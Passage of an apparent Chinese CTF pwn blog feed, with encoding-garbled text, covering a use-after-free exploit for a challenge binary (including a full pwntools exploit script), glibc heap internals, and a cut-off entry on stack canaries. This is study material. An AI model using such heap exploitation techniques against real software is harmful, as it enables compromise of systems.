†å—å¤§å°ä¸ä¸€æ ·å°±è¡Œ)</li><li>ç”³è¯·note1 å¤§å°ä¸º0x10(åŒä¸Š)</li><li>é‡Šæ”¾note0</li><li>é‡Šæ”¾note1</li><li>æ­¤æ—¶å¤§å°ä¸º0x10çš„fast binä¸­é“¾è¡¨ä¸ºnote1 -&gt; note0 </li><li>ç”³è¯·note2 å¤§å°ä¸º0x8ï¼Œé‚£ä¹ˆæ ¹æ®å †çš„åˆ†é…è§„åˆ™</li><li>note2çš„æ§åˆ¶å †å—åˆ†é…note1çš„æ§åˆ¶å †å—ï¼Œå†…å®¹å †å—åˆ†é…note0çš„æ§åˆ¶å †å—</li><li>è¿™æ—¶å€™æˆ‘ä»¬å‘note2è¾“å…¥ä¿¡æ¯ï¼Œå°±ä¼šå‚¨å­˜å†note0çš„æ§åˆ¶å †å—</li><li>ç”±äºæˆ‘ä»¬çš„note0æ²¡æœ‰è¢«èµ‹å€¼ä¸ºNULLï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨note0</li><li>å½“å†æ¬¡æ‰ç”¨note0çš„æ‰“å°åŠŸèƒ½çš„æ—¶å€™ï¼Œæ­¤æ—¶å·²ç»è¢«æˆ‘ä»¬è¦†ç›–ä¸ºåé—¨å‡½æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è°ƒç”¨åé—¨å‡½æ•°</li></ul><p>OKäº†å…„å¼Ÿä»¬ï¼Œæ˜¯ä¸æ˜¯éå¸¸ç¥å¥‡ï¼Œä¸€ä¸ªç®€å•çš„é¢˜ï¼Œéƒ½è¦å¾ˆå·§å¦™çš„åˆ©ç”¨</p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn141_1804&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdb.attach(p, gdbscript=<span class="hljs-string">&quot;b * main&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;choice :&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">32</span>, <span class="hljs-string">&quot;bbbb&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">8</span>, p32(use))<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>UAF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€æ¬¡è‰°éš¾çš„å †æ¢ç´¢</title>
    <link href="/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/"/>
    <url>/2024/07/26/%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%A0%86%E6%8E%A2%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="å †çš„è®¤è¯†"><a href="#å †çš„è®¤è¯†" class="headerlink" title="å †çš„è®¤è¯†"></a>å †çš„è®¤è¯†</h1><h2 id="åˆå§‹å †"><a href="#åˆå§‹å †" class="headerlink" title="åˆå§‹å †"></a>åˆå§‹å †</h2><ul><li>æ˜¯è™šæ‹Ÿåœ°å€ç©ºé—´çš„çš„ ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸ</li><li>æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜</li><li>åœ¨ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿä¹‹é—´ï¼Œä½œä¸ºåŠ¨æ€å†…å­˜ç®¡ç†çš„ä¸­é—´äºº</li><li>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œ å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åº</li><li>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ï¼Œé€‚ æ—¶å½’è¿˜ç»™æ“ä½œç³»ç»Ÿ</li></ul><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262317234.png"></p><ol><li>å †åŒºåŸŸä¸ºDataä¸Šè¾¹ï¼Œå¢é•¿æ–¹å‘ä¸ºä½åœ°å€åˆ°é«˜åœ°å€ </li><li>shared librariesä¹Ÿæ˜¯å †åŒºåŸŸ</li></ol><h2 id="ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨"><a href="#ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨"></a>ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262321375.png"></p><ol><li>å¯¹äºä¸»çº¿ç¨‹å¯ä»¥ç”¨brkã€mmapç”³è¯·æ ˆç©ºé—´</li><li>å¯¹äºå­çº¿ç¨‹åªèƒ½ç”¨mmapç”³è¯·æ ˆç©ºé—´</li><li>brkç”³è¯·ç©ºé—´æ˜¯æŠŠdataä¸Šé¢çš„heapå‘ä¸Šå¢é•¿ï¼Œmmapç”³è¯·ç©ºé—´æ˜¯åœ¨ç‰©ç†å†…å­˜æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€</li></ol><h2 id="å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„äº¤äº’"><a href="#å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„äº¤äº’" class="headerlink" title="å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„äº¤äº’"></a>å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„äº¤äº’</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>å†…å­˜åˆ†é…åŒºï¼Œå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨æ‰€æŒæœ‰çš„å†…å­˜æ± </p><p>æ“ä½œç³»ç»Ÿâ€“&gt;å †ç®¡ç†å™¨â€“&gt;ç”¨æˆ·</p><p>ç‰©ç†å†…å­˜â€“&gt;arenaâ€“&gt;å¯ç”¨å†…å­˜</p><p>å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„å†…å­˜äº¤æ˜“å‘ç”Ÿäºarenaä¸­ï¼Œå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨å‘æ“ä½œç³»ç»Ÿæ‰¹å‘ä¸‹æ¥çš„æœ‰æœ‰å†—ä½™çš„å†…å­˜åº“å­˜</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262338592.png"></p><h2 id="å †çš„åŸºæœ¬å•ä½chunk"><a href="#å †çš„åŸºæœ¬å•ä½chunk" class="headerlink" title="å †çš„åŸºæœ¬å•ä½chunk"></a>å †çš„åŸºæœ¬å•ä½chunk</h2><p>ç”¨æˆ·ç”³è¯·å†…å­˜çš„å•ä½ï¼Œä¹Ÿæ˜¯å †ç®¡ç†å™¨ç®¡ç†å†…å­˜çš„åŸºæœ¬å•ä½ï¼Œmalloc()è¿”å›æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªchunkçš„æ•°æ®åŒºåŸŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs [c]">struct malloc_chunk &#123;<br><br>  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */<br>  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */<br><br>  struct malloc_chunk* fd;         /* double links -- used only if free. */<br>  struct malloc_chunk* bk;<br><br>  /* Only used for large blocks: pointer to next larger size.  */<br>  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */<br>  struct malloc_chunk* bk_nextsize;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="mallco-chunk"><a href="#mallco-chunk" class="headerlink" title="mallco chunk"></a>mallco chunk</h2><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407262344788.png"></p><ul><li>prve_size ï¼šè¡¨ç¤ºå‰ä¸€ä¸ªå·²ç»é‡Šæ”¾çš„chunkçš„å¤§å°ï¼Œå½“å‰ä¸€ä¸ªchunkæ²¡æœ‰é‡Šæ”¾æ—¶ï¼Œæ— æ„ä¹‰</li><li>size ï¼šè¡¨ç¤ºè‡ªèº«chunkçš„å¤§å°ï¼Œæœ‰ä¸‰ä¸ªæ ‡å¿—ä½Aã€Mã€P<ul><li>A ï¼šchunk æ˜¯å¦å±äºä¸»çº¿ç¨‹ï¼Œ1è¡¨ç¤ºä¸å±äºï¼Œ0è¡¨ç¤ºå±äº</li><li>M ï¼šchunkæ˜¯å¦ç”¨ç”±mmapç³»ç»Ÿè°ƒç”¨åˆ†é…ï¼Œ1è¡¨ç¤ºæ˜¯ï¼Œ0è¡¨ç¤ºä¸æ˜¯</li><li>P ï¼šchunkå‰ä¸€ä¸ªchunkæ˜¯å¦åœ¨ä½¿ç”¨ï¼Œ1è¡¨ç¤ºåœ¨ä½¿ç”¨ï¼Œ0è¡¨ç¤ºè¢«é‡Šæ”¾</li></ul></li><li></li></ul><h2 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h2><h3 id="fastbin-free-chunk"><a href="#fastbin-free-chunk" class="headerlink" title="fastbin free chunk"></a>fastbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271527975.png"></p><h3 id="smallbin-free-chunk"><a href="#smallbin-free-chunk" class="headerlink" title="smallbin free chunk"></a>smallbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270001044.png"></p><h3 id="lagerbin-free-chunk"><a href="#lagerbin-free-chunk" class="headerlink" title="lagerbin free chunk"></a>lagerbin free chunk</h3><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270010770.png"></p><h2 id="binæœºåˆ¶"><a href="#binæœºåˆ¶" class="headerlink" title="binæœºåˆ¶"></a>binæœºåˆ¶</h2><h3 id="biné“¾çš„ä¿å­˜ï¼ˆstruct-malloc-stateç»“æ„ä½“ï¼‰"><a href="#biné“¾çš„ä¿å­˜ï¼ˆstruct-malloc-stateç»“æ„ä½“ï¼‰" class="headerlink" title="biné“¾çš„ä¿å­˜ï¼ˆstruct_ malloc_stateç»“æ„ä½“ï¼‰"></a>biné“¾çš„ä¿å­˜ï¼ˆstruct_ malloc_stateç»“æ„ä½“ï¼‰</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs [c]">typedef struct malloc_chunk* mchunkptr;<br>typedef struct malloc_chunk *mfastbinptr;<br>/**<br> * å…¨å±€mallocçŠ¶æ€ç®¡ç†<br> */<br>struct malloc_state<br>&#123;<br>  /* Serialize access. åŒæ­¥è®¿é—®äº’æ–¥é” */<br>  __libc_lock_define (, mutex);<br> <br>  /* Flags (formerly in max_fast).<br>   * ç”¨äºæ ‡è®°å½“å‰ä¸»åˆ†é…åŒºçš„çŠ¶æ€<br>   *  */<br>  int flags;<br> <br>  /* Set if the fastbin chunks contain recently inserted free blocks.  */<br>  /* Note this is a bool but not all targets support atomics on booleans.  */<br>  /* ç”¨äºæ ‡è®°æ˜¯å¦æœ‰fastchunk */<br>  int have_fastchunks;<br> <br>  /* Fastbins fast binsã€‚<br>   * fast binsæ˜¯binsçš„é«˜é€Ÿç¼“å†²åŒºï¼Œå¤§çº¦æœ‰10ä¸ªå®šé•¿é˜Ÿåˆ—ã€‚<br>   * å½“ç”¨æˆ·é‡Šæ”¾ä¸€å—ä¸å¤§äºmax_fastï¼ˆé»˜è®¤å€¼64ï¼‰çš„chunkï¼ˆä¸€èˆ¬å°å†…å­˜ï¼‰çš„æ—¶å€™ï¼Œä¼šé»˜è®¤ä¼šè¢«æ”¾åˆ°fast binsä¸Šã€‚<br>   * */<br>  mfastbinptr fastbinsY[NFASTBINS];<br> <br>  /* Base of the topmost chunk -- not otherwise kept in a bin */<br>  /* Top chunk ï¼šå¹¶ä¸æ˜¯æ‰€æœ‰çš„chunkéƒ½ä¼šè¢«æ”¾åˆ°binsä¸Šã€‚<br>   * top chunkç›¸å½“äºåˆ†é…åŒºçš„é¡¶éƒ¨ç©ºé—²å†…å­˜ï¼Œå½“binsä¸Šéƒ½ä¸èƒ½æ»¡è¶³å†…å­˜åˆ†é…è¦æ±‚çš„æ—¶å€™ï¼Œå°±ä¼šæ¥top chunkä¸Šåˆ†é…ã€‚ */<br>  mchunkptr top;<br> <br>  /* The remainder from the most recent split of a small request */<br>  mchunkptr last_remainder;<br> <br>  /* Normal bins packed as described above<br>   * å¸¸è§„ bins chunkçš„é“¾è¡¨æ•°ç»„<br>   * 1. unsorted binï¼šæ˜¯binsçš„ä¸€ä¸ªç¼“å†²åŒºã€‚å½“ç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¤§äºmax_fastæˆ–è€…fast binsåˆå¹¶åçš„chunkéƒ½ä¼šè¿›å…¥unsorted binä¸Š<br>   * 2. small binså’Œlarge binsã€‚small binså’Œlarge binsæ˜¯çœŸæ­£ç”¨æ¥æ”¾ç½®chunkåŒå‘é“¾è¡¨çš„ã€‚æ¯ä¸ªbinä¹‹é—´ç›¸å·®8ä¸ªå­—èŠ‚ï¼Œå¹¶ä¸”é€šè¿‡ä¸Šé¢çš„è¿™ä¸ªåˆ—è¡¨ï¼Œ<br>   * å¯ä»¥å¿«é€Ÿå®šä½åˆ°åˆé€‚å¤§å°çš„ç©ºé—²chunkã€‚<br>   * 3. ä¸‹æ ‡1æ˜¯unsorted binï¼Œ2åˆ°63æ˜¯small binï¼Œ64åˆ°126æ˜¯large binï¼Œå…±126ä¸ªbin<br>   * */<br>  mchunkptr bins[NBINS * 2 - 2];<br> <br>  /* Bitmap of bins<br>   * è¡¨ç¤ºbinæ•°ç»„å½“ä¸­æŸä¸€ä¸ªä¸‹æ ‡çš„binæ˜¯å¦ä¸ºç©ºï¼Œç”¨æ¥åœ¨åˆ†é…çš„æ—¶å€™åŠ é€Ÿ<br>   * */<br>  unsigned int binmap[BINMAPSIZE];<br> <br>  /* åˆ†é…åŒºå…¨å±€é“¾è¡¨ï¼šåˆ†é…åŒºé“¾è¡¨ï¼Œä¸»åˆ†é…åŒºæ”¾å¤´éƒ¨ï¼Œæ–°åŠ å…¥çš„åˆ†é…åŒºæ”¾main_arean.next ä½ç½® Linked list */<br>  struct malloc_state *next;<br> <br>  /* åˆ†é…åŒºç©ºé—²é“¾è¡¨ Linked list for free arenas.  Access to this field is serialized<br>     by free_list_lock in arena.c.  */<br>  struct malloc_state *next_free;<br> <br>  /* Number of threads attached to this arena.  0 if the arena is on<br>     the free list.  Access to this field is serialized by<br>     free_list_lock in arena.c.  */<br>  INTERNAL_SIZE_T attached_threads;<br> <br>  /* Memory allocated from the system in this arena.  */<br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å®é™…ç¼–è¯‘åè¿™ä¸ªç»“æ„ä½“å°±æ˜¯arena</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271319241.png"></p><ul><li><p><strong>fastbinYæ•°ç»„ï¼š</strong>å¤§å°ä¸º10ã€‚è®°å½•çš„æ˜¯fast biné“¾ã€‚<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271321437.png"></p></li><li><p><strong>binsæ•°ç»„ï¼š</strong>å¤§å°ä¸º129ã€‚è®°å½•çš„æ˜¯unsorted binï¼ˆ1ï¼‰ã€small binï¼ˆ2<del>63ï¼‰ã€large biné“¾ï¼ˆ64</del>126ï¼‰ã€‚<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407271332431.png"></p></li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>fast binæ˜¯ptmallocä¸ºäº†è§£å†³ç”¨æˆ·é¢‘ç¹çš„åˆ›å»ºç©ºé—´è¿˜èƒ½å¿«é€Ÿå“åº”çš„ç»“æ„</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407270032625.png"></p><p>è¡¨å¤´ä¸ºç‰©ç†è¿æ¥ï¼Œæ¯ä¸ªbiné“¾ä¸ºé€»è¾‘è¿æ¥ï¼Œç”¨bkæŒ‡é’ˆ</p><h4 id="fast-binç‰¹ç‚¹"><a href="#fast-binç‰¹ç‚¹" class="headerlink" title="fast binç‰¹ç‚¹"></a>fast binç‰¹ç‚¹</h4><ul><li>é‡‡ç”¨LIFOç­–ç•¥ï¼Œå’Œæ ˆç±»ä¼¼ï¼Œä¸ºå•é“¾è¡¨ç»“æ„</li><li>chunkçš„inuse bitæ°¸è¿œæ˜¯1ã€‚åº”ä¸ºfast binä¼šè¢«é¢‘ç¹ä½¿ç”¨ï¼Œæ‰€ä»¥fast binæ˜¯ä¸å‚ä¸åˆå¹¶çš„ï¼Œ</li></ul><hr><p>ä»Šåå­¦åˆ°è¡¥å……è¡¥å……</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç»•è¿‡ä¿æŠ¤ä¹‹Canary</title>
    <link href="/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/"/>
    <url>/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆè¯†Canary"><a href="#åˆè¯†Canary" class="headerlink" title="åˆè¯†Canary"></a>åˆè¯†Canary</h1><p><strong>å…³äºcanaryè¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªé˜²æ­¢æ ˆæº¢å‡ºçš„æ‰‹æ®µï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨æ ˆåº•å‰è¾¹è®¾ç½®ä¸€ä¸ªå€¼ï¼Œåœ¨è¿›ç¨‹ç»“æŸæ—¶ï¼Œå¯¹æ¯”è¿™ä¸ªå€¼æœ‰æ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œå¦‚æœç¯¡æ”¹å°±é€€å‡ºã€‚å…·ä½“æ±‡ç¼–å¦‚ä¸‹</strong><br><strong>å‡½æ•°å¼€å§‹å‰åœ¨å‡½æ•°åºè¨€éƒ¨åˆ†ä¼šå– fs å¯„å­˜å™¨ 0x28 å¤„çš„å€¼ï¼Œå­˜æ”¾åœ¨æ ˆä¸­ rbp-0x8 çš„ä½ç½®(32ä½ebp-0x4ã€‚ä½†æ˜¯è¿™ä¸ªä½ç½®ä¸æ˜¯ç»å¯¹çš„ï¼Œå¯ä»¥é€šè¿‡idaåˆ†æ)ã€‚ è¿™ä¸ªæ“ä½œå³ä¸ºå‘æ ˆä¸­æ’å…¥ Canary å€¼</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°ç»“æŸæ—¶ï¼Œä¼šå°†è¯¥å€¼å–å‡ºï¼Œå¹¶ä¸ fs:0x28 çš„å€¼è¿›è¡Œå¼‚æˆ–ã€‚å¦‚æœå¼‚æˆ–çš„ç»“æœä¸º 0ï¼Œè¯´æ˜ Canary æœªè¢«ä¿®æ”¹ï¼Œå‡½æ•°ä¼šæ­£å¸¸è¿”å›ï¼Œè¿™ä¸ªæ“ä½œå³ä¸ºæ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡º</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346584.png"></p><p><strong>å¦‚æœ Canary å·²ç»è¢«éæ³•ä¿®æ”¹ï¼Œæ­¤æ—¶ç¨‹åºæµç¨‹ä¼šèµ°åˆ° __stack_chk_failã€‚__stack_chk_fail ä¹Ÿæ˜¯ä½äº glibc ä¸­çš„å‡½æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ç»è¿‡ ELF çš„å»¶è¿Ÿç»‘å®šï¼Œè¿™ä¸ªå‡½æ•°ä¸åŒçš„libcä¼šä¸åŒï¼ˆä»glibcå¼€å§‹ 2.27åç¨æœ‰ä¸åŒï¼‰å®šä¹‰å¦‚ä¸‹</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  